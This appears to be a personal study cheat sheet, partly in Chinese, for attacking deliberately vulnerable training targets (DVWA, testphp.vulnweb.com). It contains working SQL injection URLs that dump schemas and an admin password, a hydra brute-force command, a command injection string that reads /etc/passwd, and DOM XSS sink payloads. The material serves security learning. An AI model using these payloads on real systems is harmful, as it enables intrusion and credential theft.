https://hackmd.io/cbEI1z1OSeG9SkeFnlIXGw


[dvwa WRITE UP](https://jckling.github.io/2020/04/23/Security/DVWA/2.%20Command%20Injection/)

# SQL

@@hostname
@@log
database()
version()
system_user()
table_name()

- http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,schema_name,3,4,5,6,7,8,9,10,11%20from%20information_schema.schemata
- http://testphp.vulnweb.com/listproducts.php?cat=1%20-1%20union%20all%20select%201,2,3,4,5,6,7,8,table_name,10,11%20from%20information_schema.tables
- http://testphp.vulnweb.com/listproducts.php?cat=1 AND 1=1 UNION ALL SELECT 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema='acuart'

## UNION SELECT
For a UNION query to work, two key requirements must be met:

1. The individual queries must return the same number of columns.
2. The data types in each column must be compatible between the individual queries.

```sql=!
http://10.0.2.5:65412/?id=2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||','||username||','||password FROM users WHERE username='admin')
```

### 1. check number of columns 

1.1 ORDER BY
```sql=
' ORDER BY 1
' ORDER BY 1,2,3
``` 


1.2 SELECT NULL

```sql=
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### SQLMAP

sqlmap -r /path/to/request.txt

----

# BRUTE FORCE
```bash=!
hydra -V -l admin -P rockyou.txt 192.168.0.247 -s 8080 http-get-form "/vulnerabilities/brute/:username=admin&password=testwe&Login=Login:Username and/or password incorrect.:H=Cookie\:security=low; PHPSESSID=8rnt1s7r14fth7ln4acpcj77r5"
```

----

# Command Injection

127.0.0.1|cat /etc/passwd

| 符号 | 说明 |
| --- | --- |
& | 前一条命令在后台运行
&& | 当且仅当前一条命令执行成功后执行下一条命令
\|\| | 当且仅当前一条命令执行失败后执行下一条命令
\| | 将前一条命令的标准输出（stdout）作为下一条命令的输入
; | 无论前一条指令是否执行成功，都执行下一条指令

有些被過濾後可以嘗試多加幾個 OR ENCODING

# FILE INCLUSION

allow_url_include 和 allow_url_fopen

shellfire?

----

# XSS

## DOM 

![image](https://hackmd.io/_uploads/SyP5_iYTyl.png)

常見 DOM XSS 插入點整理表：
類別 |	插入點 |	說明與範例
---|---|---
URL 相關	| location.search |	?q=<script>alert(1)</script>
x|location.hash |	#<img src=x onerror=alert(1)>
x|location.href	| 整個 URL，可包含注入片段
x|document.URL	| 與 location.href 相同
x|document.documentURI	| URL，可控
x|document.referrer |	來自前一頁的 URL，可被攻擊者控制
表單資料 |	window.name	| window.open 開啟頁面時傳遞的資料
x|history.pushState() / replaceState() |	若用來改變網址而未過濾，會成為攻擊點
x|Storage |	localStorage / sessionStorage |	若寫入來自 URL 或使用者資料，讀出時直接用進 HTML 容易出問題
x|Cookie | document.cookie | 通常不是主因，但也能從這取值進 DOM
錯誤處理 | window.onerror| 攔截錯誤資訊時如果直接輸出也可能 XSS
其他|postMessage 接收到的資料 | 若接收到跨來源訊息並未驗證其內
